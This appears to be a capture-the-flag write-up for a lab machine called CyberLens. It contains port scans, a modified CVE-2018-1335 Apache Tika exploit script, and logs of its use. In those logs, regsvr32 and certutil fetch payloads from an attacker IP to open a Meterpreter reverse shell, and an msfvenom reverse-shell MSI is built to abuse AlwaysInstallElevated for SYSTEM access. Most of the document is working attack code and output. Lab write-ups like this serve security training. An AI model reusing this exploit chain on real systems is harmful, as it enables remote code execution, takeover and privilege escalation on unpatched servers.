@@ -1,0 +1,442 @@
+## Tcp-Scan
+```
+# Nmap 7.95 scan initiated Mon Apr 21 22:42:25 2025 as: /usr/lib/nmap/nmap -sC -sV -p- -vv -T4 -oA tcpscan-cyberlens-thm cyberlens.thm
+Increasing send delay for 10.10.177.75 from 0 to 5 due to 673 out of 1682 dropped probes since last increase.
+Increasing send delay for 10.10.177.75 from 5 to 10 due to 15 out of 36 dropped probes since last increase.
+Nmap scan report for cyberlens.thm (10.10.177.75)
+Host is up, received echo-reply ttl 127 (0.17s latency).
+Scanned at 2025-04-21 22:42:25 +08 for 937s
+Not shown: 65519 closed tcp ports (reset)
+PORT      STATE SERVICE       REASON          VERSION
+80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.57 ((Win64))
+|_http-server-header: Apache/2.4.57 (Win64)
+|_http-title: CyberLens: Unveiling the Hidden Matrix
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
+| ssl-cert: Subject: commonName=CyberLens
+| Issuer: commonName=CyberLens
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-04-20T14:41:05
+| Not valid after:  2025-10-20T14:41:05
+| MD5:   da86:c081:279a:38fd:960a:7e26:a535:4bbc
+| SHA-1: 587c:6e4c:d5ea:8700:6c75:dec1:bccd:302e:0036:8777
+| -----BEGIN CERTIFICATE-----
+| MIIC1jCCAb6gAwIBAgIQQUrLjcaPZ4dAiBOMiD5wJTANBgkqhkiG9w0BAQsFADAU
+| MRIwEAYDVQQDEwlDeWJlckxlbnMwHhcNMjUwNDIwMTQ0MTA1WhcNMjUxMDIwMTQ0
+| MTA1WjAUMRIwEAYDVQQDEwlDeWJlckxlbnMwggEiMA0GCSqGSIb3DQEBAQUAA4IB
+| DwAwggEKAoIBAQDakSDzGiLjdoUHce3ZvMRJsHXFVuIKf3phrbg4zDFqg0V6ZNdu
+| Get4rCYvs/U6T+GAu0lHdhQ18b5yd9hpHJ2Ylq2P1prd3ro32xfSqM7H00dQtCts
+| mm+wXjSCWl4rnOZK+J9E2qJ2lUP1uX0eF5cHG+YLj/yBV6QaSAAz5HmocxZo1ldS
+| oc7GM5ulQDdTfnkFwhhrrh8ypsDWsEQVZFfhezw5EnD2z86/U3ML4fnEQEeGdJ98
+| HExnliKSdkcGi4uofRmLB6UbjV1FAomnXpdM8mtxFhDUzoP5P0r9y9lwcKT7h12q
+| EXo5yBOtx2IU8vOpJnErG/oTFzQUtULTFtvhAgMBAAGjJDAiMBMGA1UdJQQMMAoG
+| CCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEABS4kq3SH
+| vG+eTV2RaQAFC2PCbO6hiTR2leVdzs1C9WCqh1n23AkjqT8BvLskra+9UaejhRPo
+| RQ6K363xfk3JX2uyaVpCBYoWDgaqyqVWmbwl97cCwqgOjCwKTUlUrCzzDezuT5wm
+| GxFXs0dSpXQIjvDKgcBo8UTh06x6hGlhv+PMzkB9T7nHrnLwbV0JsIsBKcNn52B7
+| c4rzkZpwjhqUci+Hd4AoI1wFo0pAi/+7sho4fdSoAMimXVpIohY04fZefjIB6Mkm
+| QcSRG3bwwCgE704aW/cy7eUh7JQitrAKMPv0c0TjEOv5/T0yb1EJDTLvOdmG/63e
+| eRS/PNEbSyVtZQ==
+|_-----END CERTIFICATE-----
+| rdp-ntlm-info: 
+|   Target_Name: CYBERLENS
+|   NetBIOS_Domain_Name: CYBERLENS
+|   NetBIOS_Computer_Name: CYBERLENS
+|   DNS_Domain_Name: CyberLens
+|   DNS_Computer_Name: CyberLens
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-04-21T14:57:54+00:00
+|_ssl-date: 2025-04-21T14:58:02+00:00; 0s from scanner time.
+5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+61777/tcp open  http          syn-ack ttl 127 Jetty 8.y.z-SNAPSHOT
+|_http-server-header: Jetty(8.y.z-SNAPSHOT)
+|_http-cors: HEAD GET
+| http-methods: 
+|   Supported Methods: POST GET PUT OPTIONS HEAD
+|_  Potentially risky methods: PUT
+|_http-title: Site doesn't have a title (text/plain).
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 0s, deviation: 0s, median: 0s
+| smb2-time: 
+|   date: 2025-04-21T14:57:55
+|_  start_date: N/A
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 14336/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 51581/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 61954/udp): CLEAN (Failed to receive data)
+|   Check 4 (port 21717/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Apr 21 22:58:02 2025 -- 1 IP address (1 host up) scanned in 937.34 seconds
+```
+
+
+## udpscan
+```
+# Nmap 7.95 scan initiated Mon Apr 21 22:42:40 2025 as: /usr/lib/nmap/nmap -sU -vv -oA udpscan-cyberlens-thm cyberlens.thm
+Increasing send delay for 10.10.177.75 from 100 to 200 due to 11 out of 11 dropped probes since last increase.
+Nmap scan report for cyberlens.thm (10.10.177.75)
+Host is up, received echo-reply ttl 127 (0.17s latency).
+Scanned at 2025-04-21 22:42:40 +08 for 1099s
+Not shown: 992 closed udp ports (port-unreach)
+PORT     STATE         SERVICE       REASON
+123/udp  open|filtered ntp           no-response
+137/udp  open|filtered netbios-ns    no-response
+138/udp  open|filtered netbios-dgm   no-response
+500/udp  open|filtered isakmp        no-response
+3389/udp open|filtered ms-wbt-server no-response
+4500/udp open|filtered nat-t-ike     no-response
+5353/udp open|filtered zeroconf      no-response
+5355/udp open|filtered llmnr         no-response
+
+Read data files from: /usr/share/nmap
+# Nmap done at Mon Apr 21 23:00:59 2025 -- 1 IP address (1 host up) scanned in 1099.17 seconds
+```
+
+
+## Website feature
+````
+CyberLens Image Extractor
+
+
+In this labyrinthine realm of cybersecurity, we have mastered the arcane arts of metadata extraction, the all-seeing eye that gazes into the depths of files, extracting their hidden truths. With the CyberLens Image Extractor as our trusty sidekick, we delve into the very fabric of digital images, peeling back layers of metadata to expose the unseen stories they yearn to tell.
+```
+
+
+## HTTP port 80 javascript
+```
+    document.addEventListener("DOMContentLoaded", function() {
+      document.getElementById("metadataButton").addEventListener("click", function() {
+        var fileInput = document.getElementById("imageFileInput");
+        var file = fileInput.files[0];
+  
+        var reader = new FileReader();
+        reader.onload = function() {
+          var fileData = reader.result;
+  
+          fetch("http://cyberlens.thm:61777/meta", {
+            method: "PUT",
+            body: fileData,
+            headers: {
+              "Accept": "application/json",
+              "Content-Type": "application/octet-stream"
+            }
+          })
+          .then(response => {
+            if (response.ok) {
+              return response.json();
+            } else {
+              throw new Error("Error: " + response.status);
+            }
+          })
+          .then(data => {
+            var metadataOutput = document.getElementById("metadataOutput");
+            metadataOutput.innerText = JSON.stringify(data, null, 2);
+          })
+          .catch(error => {
+            console.error("Error:", error);
+          });
+        };
+  
+        reader.readAsArrayBuffer(file);
+      });
+    });
+```
+
+
+## Using modified exploit file 
+## https://www.exploit-db.com/exploits/46540
+```
+import sys
+import requests
+
+if len(sys.argv) < 4:
+	print("Usage: python CVE-2018-1335.py <host> <port> <command>")
+	print("Example: python CVE-2018-1335.py localhost 9998 calc.exe")
+else:
+    host = sys.argv[1]
+    port = sys.argv[2]
+    cmd = sys.argv[3]
+
+    url = host + ":" + str(port) + "/meta"
+
+    proxies = {
+        "http": "http://localhost:8111",
+        "https": "http://localhost:8111",
+    }
+
+    headers = {"X-Tika-OCRTesseractPath": "\"cscript\"", 
+        "X-Tika-OCRLanguage": "//E:Jscript", 
+        "Expect": "100-continue", 
+        "Content-type": "image/jp2", 
+        "Connection": "close"}
+
+    jscript='''var oShell = WScript.CreateObject("WScript.Shell");
+    var oExec = oShell.Exec('cmd /c {}');
+    '''.format(cmd)
+
+    try: 
+        r = requests.put("http://" + url, headers=headers, data=jscript, verify=False, proxies=proxies)
+        print(r.status_code)
+        print(r.text)
+    except Exception as err:
+        print("Error: ", err)
+       
+```
+
+
+## Output
+```
+(cyberlens) % python3 exploit.py cyberlens.thm 61777 'certutil -urlcache -split -f http://10.14.102.34/'
+
+200
+"X-Parsed-By","org.apache.tika.parser.DefaultParser","org.apache.tika.parser.ocr.TesseractOCRParser","org.apache.tika.parser.EmptyParser"
+"language",""
+"Content-Type","image/jp2"
+```
+
+
+## Attack server
+```
+┌──(kali㉿kali)-[~/thm/cyberlens]
+└─$ python3 -m http.server -b 10.14.102.34 80
+Serving HTTP on 10.14.102.34 port 80 (http://10.14.102.34:80/) ...
+10.10.177.75 - - [21/Apr/2025 23:12:26] "GET / HTTP/1.1" 200 -
+10.10.177.75 - - [21/Apr/2025 23:12:27] "GET / HTTP/1.1" 200 -
+```
+
+
+## We got a shell here via leveraging web delivery + rce
+```
+
+(cyberlens) % python3 exploit.py cyberlens.thm 61777 'regsvr32 /s /n /u /i:http://10.14.102.34:8080/4RNULg.sct scrobj.dll'
+200
+"X-Parsed-By","org.apache.tika.parser.DefaultParser","org.apache.tika.parser.ocr.TesseractOCRParser","org.apache.tika.parser.EmptyParser"
+"language",""
+"Content-Type","image/jp2"
+
+
+msf6 exploit(multi/script/web_delivery) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/script/web_delivery) > 
+[*] Started reverse TCP handler on 10.14.102.34:4444 
+[*] Using URL: http://10.14.102.34:8080/4RNULg
+[*] Server started.
+[*] Run the following command on the target machine:
+regsvr32 /s /n /u /i:http://10.14.102.34:8080/4RNULg.sct scrobj.dll
+[*] 10.10.177.75     web_delivery - Handling .sct Request
+[*] 10.10.177.75     web_delivery - Delivering Payload (3752 bytes)
+[*] Sending stage (203846 bytes) to 10.10.177.75
+
+msf6 exploit(multi/script/web_delivery) > [*] Meterpreter session 1 opened (10.14.102.34:4444 -> 10.10.177.75:49921) at 2025-04-21 23:20:24 +0800
+```
+
+
+## Current shell privs
+```
+meterpreter > shell
+Process 3252 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami  /priv
+whoami  /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+C:\Windows\system32>
+```
+
+
+## Enumerating privs
+```
+C:\Windows\system32>net user cyberlens
+net user cyberlens
+User name                    CyberLens
+Full Name                    
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            6/6/2023 7:10:41 PM
+Password expires             Never
+Password changeable          6/6/2023 7:10:41 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   4/21/2025 2:41:15 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Desktop Users *Users                
+Global Group memberships     *None                 
+The command completed successfully.
+
+C:\Windows\system32>net localgroup administrators
+net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+The command completed successfully.
+
+
+
+## More enumeration
+```
+PS > invoke-allchecks
+
+
+ModifiablePath    : C:\Users\CyberLens\AppData\Local\Microsoft\WindowsApps
+IdentityReference : CYBERLENS\CyberLens
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+%PATH%            : C:\Users\CyberLens\AppData\Local\Microsoft\WindowsApps
+Name              : C:\Users\CyberLens\AppData\Local\Microsoft\WindowsApps
+Check             : %PATH% .dll Hijacks
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\CyberLens\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
+
+Check         : AlwaysInstallElevated Registry Key
+AbuseFunction : Write-UserAddMSI
+
+DefaultDomainName    : CHANGE-MY-HOSTN
+DefaultUserName      : CyberLens
+DefaultPassword      :
+AAltDefaultUserName   :
+AltDefaultPassword   :
+Check                : Registry Autologons
+
+C:\Windows\system32>reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+
+C:\Windows\system32>reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+```
+
+
+## Privilege Escalation
+```
+meterpreter > upload rev.msi c://temp/
+[*] Uploading  : /home/kali/thm/cyberlens/rev.msi -> c://temp/\rev.msi
+[*] Completed  : /home/kali/thm/cyberlens/rev.msi -> c://temp/\rev.msi
+meterpreter > shell
+Process 2396 created.
+Channel 9 created.
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd \temp
+cd \temp
+
+C:\temp>dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\temp
+
+04/21/2025  04:30 PM    <DIR>          .
+04/21/2025  04:30 PM    <DIR>          ..
+04/21/2025  04:27 PM           159,744 add_admin.msi
+04/21/2025  04:33 PM           159,744 rev.msi
+               2 File(s)        319,488 bytes
+               2 Dir(s)  14,858,690,560 bytes free
+
+C:\temp>rev.msi
+
+┌──(kali㉿kali)-[~/thm/cyberlens]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.102.34 LPORT=443 -f msi > rev.msi
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of msi file: 159744 bytes
+
+                                                                                                                                                                                       
+┌──(kali㉿kali)-[~/thm/cyberlens]
+└─$ nc -nlvp 443 -s 10.14.102.34  
+Listening on 10.14.102.34 443
+Connection received on 10.10.182.83 49732
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State   
+=============================== ========================================= ========
+SeAssignPrimaryTokenPrivilege   Replace a process level token             Disabled
+SeLockMemoryPrivilege           Lock pages in memory                      Enabled 
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
+SeTcbPrivilege                  Act as part of the operating system       Enabled 
+SeSecurityPrivilege             Manage auditing and security log          Enabled 
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeProfileSingleProcessPrivilege Profile single process                    Enabled 
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled 
+SeCreatePagefilePrivilege       Create a pagefile                         Enabled 
+SeCreatePermanentPrivilege      Create permanent shared objects           Enabled 
+SeBackupPrivilege               Back up files and directories             Disabled
+SeRestorePrivilege              Restore files and directories             Disabled
+SeShutdownPrivilege             Shut down the system                      Disabled
+SeAuditPrivilege                Generate security audits                  Enabled 
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege         Create global objects                     Enabled 
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled
+
+```
+
